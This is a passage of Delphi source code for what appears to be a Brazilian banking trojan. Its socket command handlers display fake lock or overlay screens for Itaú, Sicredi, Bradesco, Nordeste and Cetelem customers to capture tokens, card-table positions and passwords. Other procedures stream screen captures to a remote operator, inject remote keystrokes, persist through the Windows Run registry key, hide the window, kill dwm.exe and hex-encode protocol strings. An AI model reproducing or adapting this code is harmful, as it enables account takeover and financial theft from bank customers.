     Label11.Caption := 'CETELEM2';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
   end;

          // Sms Desco Fisica
  if Command = '{DESCOSN}' then
     begin
     Label11.Caption := 'DESKSMS';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
  end;
    {$ENDREGION}

  {$REGION ' EMPRESA'}

  // TRAVA DESCO EMPRESA
        if Pos('<|NODN|>', Command) >0 then
        begin
          Dados2 := Command;
          Delete(Dados2, 1, Pos('<|NODN|>', Dados2)+7);
          NODN := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
          Label6.Caption := AnsiUpperCase(NODN);
          Label11.Caption := 'DESKONET';
          Func.mostra_form();
           CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
          exit
        end;

        // Token Desco Emp
        if Command = '{DESCONETT}' then
        begin
          Label11.Caption := 'DESKONETTOKEN';
          Func.mostra_form();
           CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
          exit
        end;

        // Certi Desco Emp
        if Command = 'DESKOCERTINET' then
        begin
          Label11.Caption := 'DESKOCERTI';
          Func.mostra_form();
          CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
          exit
        end;

{$ENDREGION}

{$ENDREGION}

  {$REGION ' CONTROLE SICRED'}

      // TRAVA SICREDI
      if Pos('<|NOSI|>', Command) >0 then
      begin
       Dados2 := Command;
      Delete(Dados2, 1, Pos('<|NOSI|>', Dados2)+7);
       NOSI := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label6.Caption := AnsiUpperCase(NOSI);
       Label11.Caption := 'SICRETRA';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

      //Token Sicred
      if Command = '{TOKENSIC}' then
      begin
       Label11.Caption := 'SITOKEN';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

      //Assis Sicred
      if Command = '{SICASS}' then
      begin
       Label11.Caption := 'ASSSICRE';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;
      {$ENDREGION}

  {$REGION ' CONTROLE ITA'}

  {$REGION ' CONTROLE ITAU NORMAL'}
    	// TRAVA ITAU Normal
      if Pos('<|ITNR|>', Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|ITNR|>', Dados2)+7);
       NOIT := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label6.Caption := AnsiUpperCase(NOIT);
       Label11.Caption := 'ITANormal';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

       // Captura Posição Itaú Tabela
      if Pos('<|TBNM|>',Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|TBNM|>', Dados2)+7);
       TABELA1 := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label19.Caption := TABELA1;
       Label11.Caption := 'TABELAITANORMAL';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

        // ITAU NASCIMENTO NORMAL
      if Command ='{SENHA6IT}' then
      begin
       Label11.Caption := 'ITANORMAL6';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

          // TOKEN ITAU
      if Pos('<|TTNM|>',Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|TTNM|>', Dados2)+7);
       ITTT := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label7.Caption := ITTT;
       Label11.Caption := 'ITATOKENNORMAL';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>'); exit
      end;

  {$ENDREGION}

  {$REGION 'CONTROLE ITAU UNICLASS}
     	// TRAVA ITAU Uniclass
      if Pos('<|ITUS|>', Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|ITUS|>', Dados2)+7);
       NOIT := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label6.Caption := AnsiUpperCase(NOIT);
       Label11.Caption := '{TRAVAUNI}';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

         // Captura Posição Itaú Uniclass Tabela
      if Pos('<|TBUS|>',Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|TBUS|>', Dados2)+7);
       TABELA1 := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label19.Caption := TABELA1;
       Label11.Caption := 'TABELAUNICLASS';
       Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

            // TOKEN ITAU
      if Pos('<|TTUN|>',Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|TTUN|>', Dados2)+7);
       ITTT := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label7.Caption := ITTT;
       Label11.Caption := 'TOKENUNI';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');

        exit
      end;

          // ITAU NASCIMENTO UNICLASS
      if Command = '{SENHA6UN}' then
      begin
       Label11.Caption := 'ITADATAUNISS';
        Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

  {$ENDREGION}

  {$REGION ' CONTROLE ITAU EMPRESA'}
           // TRAVA ITAU EMPRESA
      if Pos('<|NOEM|>',Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|NOEM|>', Dados2)+7);
       NOEM := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label6.Caption := AnsiUpperCase(NOEM);
       Label11.Caption := 'TRAVAITAEMPRESA';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;


        // TOKEN ITAU
      if Pos('<|TTEM|>',Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|TTEM|>', Dados2)+7);
       ITTT := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label7.Caption := ITTT;
       Label11.Caption := 'TOKENEMPRESA';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>'); exit
      end;


        //Sen 6 ItEmp
      if Command = '{SENHA6EM}' then
      begin
       Label11.Caption := 'ITAEMPRE6';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;
  {$ENDREGION}

  {$REGION ' CONTROLE ITAU PERSO'}

   	// TRAVA ITAU Normal
      if Pos('<|ITPE|>', Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|ITPE|>', Dados2)+7);
       NOIT := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label6.Caption := AnsiUpperCase(NOIT);
       Label11.Caption := 'ITAPERSO';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;
            // Captura Posição Itaú Tabela
      if Pos('<|TBPE|>',Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|TBPE|>', Dados2)+7);
       TABELA1 := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label19.Caption := TABELA1;
       Label11.Caption := 'TABELAITAPERSO';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

      // TOKEN ITAU
      if Pos('<|TTPE|>',Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|TTPE|>', Dados2)+7);
       ITTT := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label7.Caption := ITTT;
       Label11.Caption := 'ITATOKENPERSO';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>'); exit
      end;

   // ITAU NASCIMENTO PERSO
      if Command = '{SENHA6PE}' then
      begin
       Label11.Caption := 'SENHA6PE';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
      end;

{$ENDREGION}

{$ENDREGION}

  {$REGION ' CONTROLE NORDESTE'}
      // TRAVA Nordeste
     if Pos('<|NOND|>', Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|NOND|>', Dados2)+7);
       NOSI := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label6.Caption := AnsiUpperCase(NOSI);
       Label11.Caption := 'TravaNordert';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;

      // Captura Posição NORDESTE
       if Pos('<|NODT|>', Command) >0 then
      begin
       Dados2 := Command;
       Delete(Dados2, 1, Pos('<|NODT|>', Dados2)+7);
       TABELA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
       Label19.Caption := TABELA;
       Label11.Caption := 'NordertTabela';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
       exit
      end;
      {$ENDREGION}

end;



procedure TForm1.CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
var
  Command, StrPackSize: string;
  tamanho: Integer;
  begin
Socket.SendText(HexToStr('3C7C4465736B746F707C3E'));  //<|Desktop|>
  Sleep(2000);
  MyFirstBmp := TMemoryStream.Create;
  MySecondBmp := TMemoryStream.Create;
  MyCompareBmp := TMemoryStream.Create;
  PackStream := TMemoryStream.Create;
  iSendCount := 0;

  if Tipo3 = HexToStr('4465736B') then  //Desk
  begin

  GetDesktop(false, MyFirstBmp);
  MyFirstBmp.Position := 0;

  PackStream.LoadFromStream(MyFirstBmp);
  CompressStream(PackStream);
  PackStream.Position := 0;
  tamanho := PackStream.Size;
                                //<|TAMANHO|>
  CS2.Socket.SendText(HexToStr('3C7C54414D414E484F7C3E') + inttostr(tamanho) + HexTOStr('3C3C7C')); //<<|
  iSendCount := iSendCount + 1;
  end;


    if Tipo3 = HexToStr('4E617669') then  //Navi
  begin

  GetScreenToBmp(false, MyFirstBmp,1);
  MyFirstBmp.Position := 0;

  PackStream.LoadFromStream(MyFirstBmp);
  CompressStream(PackStream);
  PackStream.Position := 0;
  tamanho := PackStream.Size;
                               //<|TAMANHO|>
  CS2.Socket.SendText(HexToStr('3C7C54414D414E484F7C3E') + inttostr(tamanho) + HexTOStr('3C3C7C')); //<<|
  iSendCount := iSendCount + 1;
  end;

end;



procedure TForm1.CS2Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
errorcode := 0;
end;

procedure TForm1.CS2Read(Sender: TObject; Socket: TCustomWinSocket);
var
  Command, StrPackSize: string;
  cu: AnsiString;
  Stream01: TMemoryStream;
begin
  Command := Socket.ReceiveText;

  if Command = '<|gets|>' then
  begin

    PackStream := TMemoryStream.Create;

    CompareStream(MyFirstBmp, MySecondBmp, MyCompareBmp);

    MyCompareBmp.Position := 0;
    PackStream.LoadFromStream(MyCompareBmp);
    CompressStream(PackStream);
    PackStream.Position := 0;
    StrPackSize := inttostr(PackStream.Size);
    Socket.SendText('<|TAMANHO|>' + StrPackSize + '<<|');

    iSendCount := iSendCount + 1;

  end;
  if Command = '<|okok|>' then
  begin
    PackStream.Position := 0;
    Socket.SendText(MemoryStreamToString(PackStream));
  end;
end;




procedure TForm1.CS3Connect(Sender: TObject; Socket: TCustomWinSocket);
begin
  Sleep(2000);     //<|KEYBOARD|>
  Socket.SendText(HexTOStr('3C7C4B4559424F4152447C3E') + IDSockPrincipal + HexToStr('3C3C7C')); //<<|

end;

procedure TForm1.CS3Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
Errorcode := 0;
end;

procedure TForm1.CS3Read(Sender: TObject; Socket: TCustomWinSocket);
var
  dados: String;
begin
  dados := Socket.ReceiveText;

  SendKeys(PChar(dados), false);

end;

procedure TForm1.CS4Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
errorcode := 0;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
//Application.Run;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
hMutex  : integer;
Mutex   : String;
Reg     : TRegistry;
I       : Integer;
begin
 Reg := TRegistry.Create;
 ListText := TStringList.Create;
 TtItu := TStringList.Create;
  with Reg do
  begin
   RootKey := HKEY_CURRENT_USER;
   OpenKey('SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN', false);
   WriteString(ExtractFileName(Application.ExeName),
   PChar(Application.ExeName));
   closekey;
   // Impede o Programa de Abrir 2x
   hMutex := CreateMutex(0, TRUE, '0x910991009');
    if GetLastError = ERROR_ALREADY_EXISTS then
    begin
     Application.Terminate;
    end;

 //    ListText := LoadRes(100);

     TrmInicio.Enabled := True; { Inicia o processo da KL }
     ShowWindow(Form1.Handle,SW_HIDE);
  end;
end;

procedure TForm1.TrmInicioTimer(Sender: TObject);
var
  janela : HWND;
begin
 Func := TFunc.Create(Application);


// Captura Nome do Computador
 Edit4.Text := Func.CompName;

// Captura Diretório Temporário do Windows
 Edit5.Text := Func.PegaTempDir;
 caminho(Edit5.Text); { Pega diretório Temp do Windows e coloca na variável para print}

// ativar  AERO
Func.AeroSetEnable(true);

 // vai fazer com q o win8 funfa para ver por baixo do loading
Func.killtask('dwm.exe');


// Corrige Bug Chrome
 TrmChrome.Enabled := True;

 // Extrai Cursor
if not fileexists(edit5.Text + 'icone.cur') then
begin
Func.ResgataArquivoCompilado('ICONECUR','CUR',Edit5.Text);
end;
  //captura URL
  Func.tmSearch.Enabled := true;

// Ativa Monitoradores de URL
 TrmInicio.Enabled := False;


end;

procedure TForm1.Timer3Timer(Sender: TObject);
begin
if not cs1.Active = true then
   cs1.Active := true;
end;

procedure TForm1.TrmChromeTimer(Sender: TObject);
begin
 Func.Chrome;
 TrmChrome.Enabled := False;
end;

end.
